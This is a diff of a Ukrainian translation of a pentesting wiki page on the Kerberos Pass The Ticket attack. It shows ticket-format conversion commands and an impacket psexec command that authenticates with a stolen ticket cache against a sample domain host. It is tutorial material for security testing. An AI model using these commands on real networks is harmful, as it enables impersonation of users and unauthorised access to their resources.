@@ -4,16 +4,16 @@
 
 ## Pass The Ticket (PTT)
 
-У методі атаки **Pass The Ticket (PTT)** зловмисники **викрадають квиток автентифікації користувача** замість його пароля або хеш-значень. Цей викрадений квиток потім використовується для **видавання себе за користувача**, отримуючи несанкціонований доступ до ресурсів і сервісів у мережі.
+У методі атаки **Pass The Ticket (PTT)** атакувальники **викрадають authentication ticket користувача** замість його пароля або значень hash. Потім цей викрадений ticket використовується для **імперсонації користувача**, отримуючи несанкціонований доступ до ресурсів і сервісів у межах мережі.<sup>[[1]](#references)</sup>
 
-**Читати**:
+**Читайте**:
 
-- [Збирання квитків з Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
-- [Збирання квитків з Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
+- [Збір tickets із Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
+- [Збір tickets із Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **Обмін квитками Linux і Windows між платформами**
+### **Обмін Linux і Windows tickets між платформами**
 
-Інструмент [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) конвертує формати квитків, використовуючи лише сам квиток і вихідний файл.
+Інструмент [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) конвертує формати tickets, використовуючи лише сам ticket і вихідний файл.
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -21,9 +21,9 @@ Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
-В Windows [Kekeo](https://github.com/gentilkiwi/kekeo) може бути використаний.
+У Windows можна використовувати [Kekeo](https://github.com/gentilkiwi/kekeo).
 
-### Атака Pass The Ticket
+### Pass The Ticket Attack
 ```bash:Linux
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
@@ -38,6 +38,6 @@ klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 ```
 ## Посилання
 
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [1] [Kerberos (II): Як атакувати Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
 {{#include ../../banners/hacktricks-training.md}}
